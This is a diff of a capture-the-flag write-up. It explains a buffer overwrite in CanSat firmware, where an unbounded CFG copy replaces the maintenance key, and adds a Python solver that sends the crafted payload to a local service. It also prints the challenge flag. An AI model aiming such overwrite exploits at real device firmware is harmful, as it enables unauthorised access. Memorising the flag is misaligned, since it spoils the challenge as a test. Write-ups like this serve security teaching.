@@ -21,52 +21,104 @@ Get the CanSat to dump its service telemetry.
 
 ## Solution
 
-### Steps
+### Analysis
 
-Exploit the CFG input length to overwrite the maintenance service key, authenticate with the chosen key, and request the DUMP command.
+Inspect `Sat.__init__`, `Sat.cfg`, and `Sat.auth` in `foundation_one_fw.py`:
+
+```python
+self.mem = bytearray(24)
+self.mem[16:20] = os.urandom(4)
+
+# In cfg():
+for i in range(len(payload)):
+    self.mem[i] = payload[i]
+
+# In auth():
+if len(key4) == 4 and bytes(key4) == bytes(self.mem[16:20]):
+    self.maint = True
+```
+
+The configuration command accepts a variable-length byte sequence and starts copying it at index zero **without enforcing the logical 16-byte configuration region**. The service key is stored in `mem[16:20]` within the same 24-byte buffer. Consequently, 20 configuration bytes remain inside the Python bytearray but overwrite the key's protected logical region. This is **not** a write past the 24-byte Python buffer.
+
+An attacker can send 16 padding bytes followed by four attacker-chosen bytes (here ASCII `ABCD`), authenticate with the same four bytes, then issue the maintenance-only `DUMP` command. The provided exploit now parses the firmware's AST and finds the `os.urandom(...)` assignment to a `self.mem[start:end]` slice, so the service-key offset is discovered from the artifact instead of copied from prior analysis.
 
 ### Reproduction
 
-Run the supplied solver with the original challenge inputs in the paths expected by the source code.
-
-Start the firmware service in the first terminal:
+Run the supplied local service in one terminal:
 
 ```bash
 python3 foundation_one_fw.py
 ```
 
-Then run the exploit in a second terminal:
+In another terminal, with `foundation_one_fw.py` and `305.py` in the same directory:
 
 ```bash
 python3 305.py
 ```
 
-Expected relevant output:
+The solver defaults to `127.0.0.1:9707`; optional host and port arguments are supported. Expected relevant output:
 
 ```text
+Firmware service-key region: mem[16:20]
 Foundation One CanSat link up. HELP for commands.
 CFG 0000000000000000000000000000000041424344: CFG LOADED 20 bytes
 AUTH 41424344: MAINT OK
 DUMP: SVC TLM imu=A3387 co2=A5190 radio=A4075 payload=GAIANSPACE{c4nsat_t3lemetry_pwn3d}
-
 FLAG: GAIANSPACE{c4nsat_t3lemetry_pwn3d}
 ```
 
-### Exploit Code
+No third-party Python packages are required; `foundation_one_fw.py` uses only the standard library. The exploit does not need to know the randomly generated original service key.
+
+### Solver Code
 
 ```python
 
 #!/usr/bin/env python3
+# Dependencies: Python 3 standard library only.
+
+import ast
+from pathlib import Path
 import re
 import socket
 import sys
 
+FIRMWARE = Path("foundation_one_fw.py")
+
+
+def service_key_offset(source: str) -> tuple[int, int]:
+    # Recover the service-key slice from Sat.__init__, without executing firmware.
+    tree = ast.parse(source)
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Assign):
+            continue
+        for target in node.targets:
+            if not isinstance(target, ast.Subscript):
+                continue
+            if not isinstance(target.value, ast.Attribute) or target.value.attr != "mem":
+                continue
+            if not isinstance(target.slice, ast.Slice):
+                continue
+            lo = target.slice.lower
+            hi = target.slice.upper
+            if not isinstance(lo, ast.Constant) or not isinstance(hi, ast.Constant):
+                continue
+            if not isinstance(node.value, ast.Call):
+                continue
+            if isinstance(node.value.func, ast.Attribute) and node.value.func.attr == "urandom":
+                return int(lo.value), int(hi.value)
+    raise ValueError("Unable to locate firmware maintenance-key range")
+
+
 HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
 PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9707
 
-# Overwrite the service key at offsets 16 through 19.
+# Extract the key's memory range from the supplied firmware before exploiting CFG.
+key_start, key_end = service_key_offset(FIRMWARE.read_text(encoding="utf-8"))
 new_key = b"ABCD"
-payload = bytes(16) + new_key
+if key_end - key_start != len(new_key):
+    raise ValueError("Service-key length differs from the expected protocol key size")
+print(f"Firmware service-key region: mem[{key_start}:{key_end}]")
+payload = bytes(key_start) + new_key
 
 commands = [
     b"CFG " + payload.hex().encode("ascii"),
